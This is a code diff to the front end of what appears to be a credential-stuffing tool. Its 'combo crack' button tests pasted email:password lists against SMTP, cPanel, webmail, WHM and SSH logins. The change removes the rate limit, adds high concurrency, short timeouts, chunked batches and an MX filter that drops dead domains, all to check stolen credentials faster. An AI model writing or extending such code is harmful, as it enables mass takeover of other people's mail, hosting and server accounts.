@@ -1003,57 +1003,88 @@ $('#btn-combo-crack').addEventListener('click', async () => {
   const prog = $('#combo-progress');
   const statusEl = $('#combo-status');
   const btn = $('#btn-combo-crack');
-  const parsed = parse($('#combo-input').value);
-  if (!parsed.records.length) {
+  const mode = $('#combo-mode')?.value || 'smtp';
+  const concurrency = Math.max(1, Number($('#combo-concurrency')?.value) || 50);
+  const timeoutSec = Math.max(2, Number($('#combo-timeout')?.value) || 5);
+  const useMxFilter = $('#combo-mx-filter')?.checked !== false;
+  let records = parse($('#combo-input').value).records;
+
+  if (!records.length) {
     out.innerHTML = '<tr><td colspan="7" class="empty-row">Paste at least one email:password line.</td></tr>';
-    statusEl.textContent = parsed.errors.length ? parsed.errors.length + ' line(s) skipped' : '';
     return;
   }
-  const maxPerSec = Math.max(0, Number($('#opt-maxrate').value) || 0);
-  const intervalMs = maxPerSec > 0 ? Math.floor(1000 / maxPerSec) : 0;
+
   btn.disabled = true;
   out.innerHTML = '';
-  prog.textContent = '0 / ' + parsed.records.length;
-  statusEl.textContent = '';
-  const rows = [];
-  let done = 0;
+  prog.textContent = '0 / ' + records.length;
+  statusEl.textContent = 'Starting ' + mode + ' mode (concurrency ' + concurrency + ', timeout ' + timeoutSec + 's)…';
+  const t0 = Date.now();
+  const CHUNK_SIZE = 100;
+
   try {
-    for (const rec of parsed.records) {
-      if (intervalMs) await new Promise((res) => setTimeout(res, intervalMs));
-      const host = comboDeriveHost(rec);
-      const panelTarget = { host, user: rec.user, pass: rec.pass };
-      const smtpCred = { user: rec.user, pass: rec.pass, host: rec.host || null, port: rec.port || 587 };
-      const promises = [
-        api.checkSmtp([smtpCred], { concurrency: 1, maxPerSec, proxyConfig: settings?.proxy }).catch((e) => ({ error: e.message })),
-        host ? api.checkCpanel([panelTarget], { port: 2083, concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
-        host ? api.checkWebmail([panelTarget], { port: 443, path: '/webmail', concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
-        host ? api.checkWhm([panelTarget], { port: 2087, concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
-        host ? api.checkSsh([panelTarget], { port: 22, concurrency: 1, maxPerSec }).catch((e) => ({ error: e.message })) : Promise.resolve({ results: [] }),
-      ];
-      const [smtp, cp, wm, whm, ssh] = await Promise.allSettled(promises);
-      const row = {
-        user: rec.user,
-        host,
-        smtp: smtp.status === 'fulfilled' ? (smtp.value.results?.[0] || null) : null,
-        cpanel: cp.status === 'fulfilled' ? (cp.value.results?.[0] || null) : null,
-        webmail: wm.status === 'fulfilled' ? (wm.value.results?.[0] || null) : null,
-        whm: whm.status === 'fulfilled' ? (whm.value.results?.[0] || null) : null,
-        ssh: ssh.status === 'fulfilled' ? (ssh.value.results?.[0] || null) : null,
-      };
-      rows.push(row);
-      done++;
-      prog.textContent = done + ' / ' + parsed.records.length;
-      out.innerHTML = rows.map(comboRenderRow).join('');
+    if (useMxFilter && (mode === 'smtp' || mode === 'all') && typeof api.mxResolve === 'function') {
+      statusEl.textContent = 'Resolving MX for ' + records.length + ' combos…';
+      const domains = [...new Set(records.map((r) => comboDeriveHost(r)).filter(Boolean))];
+      const mx = await api.mxResolve(domains).then((r) => r.mx || {}).catch(() => ({}));
+      const before = records.length;
+      records = records.filter((r) => { const h = comboDeriveHost(r); return !h || mx[h] !== false; });
+      const skipped = before - records.length;
+      prog.textContent = '0 / ' + records.length;
+      if (skipped > 0) statusEl.textContent = 'MX filter skipped ' + skipped + ' dead-domain combos. Running ' + records.length + '…';
     }
-    const hits = rows.filter((r) =>
-      r.cpanel?.valid || r.webmail?.valid || r.whm?.valid || r.ssh?.valid ||
-      (r.smtp && (r.smtp.status === 'valid' || r.smtp.status === 'inbox' || r.smtp.status === 'spam'))
-    );
-    statusEl.textContent = hits.length
-      ? hits.length + ' combo(s) had at least one successful protocol.'
-      : 'No successful protocol hits in this batch.';
+
+    const total = records.length;
+    for (let i = 0; i < total; i += CHUNK_SIZE) {
+      const chunk = records.slice(i, i + CHUNK_SIZE);
+
+      if (mode === 'smtp' || mode === 'all') {
+        const smtpCreds = chunk.map((r) => ({ user: r.user, pass: r.pass, host: r.host || null, port: r.port || 587 }));
+        const res = await api.checkSmtp(smtpCreds, {
+          concurrency, maxPerSec: 0,
+          connectTimeout: timeoutSec * 1000, sendTimeout: timeoutSec * 1000,
+        }).catch((e) => ({ error: e.message }));
+        const rows = (res.results || chunk.map((r) => ({ cred: r, status: 'dead', reason: 'ipc-error' })));
+        out.insertAdjacentHTML('beforeend', rows.map((r) => comboRenderRow({
+          user: r.cred?.user || '?', host: comboDeriveHost(r.cred || {}), smtp: r,
+        })).join(''));
+      }
+
+      if (mode === 'panels' || mode === 'all') {
+        const panelTargets = chunk.map((r) => ({ host: comboDeriveHost(r), user: r.user, pass: r.pass })).filter((t) => t.host);
+        if (panelTargets.length > 0) {
+          const settled = await Promise.allSettled([
+            api.checkCpanel(panelTargets, { concurrency, port: 2083, timeout: timeoutSec * 1000 }),
+            api.checkWebmail(panelTargets, { concurrency, port: 443, path: '/webmail', timeout: timeoutSec * 1000 }),
+            api.checkWhm(panelTargets, { concurrency, port: 2087, timeout: timeoutSec * 1000 }),
+            api.checkSsh(panelTargets, { concurrency, port: 22, timeout: timeoutSec * 1000 }),
+          ]);
+          const byHost = new Map();
+          const keys = ['cpanel', 'webmail', 'whm', 'ssh'];
+          settled.forEach((s, idx) => {
+            if (s.status !== 'fulfilled' || !s.value?.results) return;
+            s.value.results.forEach((r) => {
+              const cur = byHost.get(r.host) || {};
+              cur[keys[idx]] = r;
+              byHost.set(r.host, cur);
+            });
+          });
+          chunk.forEach((r) => {
+            const h = comboDeriveHost(r);
+            const p = byHost.get(h) || {};
+            out.insertAdjacentHTML('beforeend', comboRenderRow({ user: r.user, host: h, cpanel: p.cpanel, webmail: p.webmail, whm: p.whm, ssh: p.ssh }));
+          });
+        }
+      }
+
+      while (out.children.length > 2000) out.removeChild(out.firstElementChild);
+      prog.textContent = Math.min(i + chunk.length, total) + ' / ' + total;
+      await new Promise((res) => setTimeout(res, 0));
+    }
+
+    const elapsed = Math.round((Date.now() - t0) / 1000);
+    statusEl.textContent = 'Completed ' + total + ' combos in ' + elapsed + 's (' + mode + ' mode).';
   } catch (err) {
-    statusEl.textContent = 'Combo crack failed: ' + err.message;
+    statusEl.textContent = 'Error: ' + err.message;
   } finally {
     btn.disabled = false;
   }
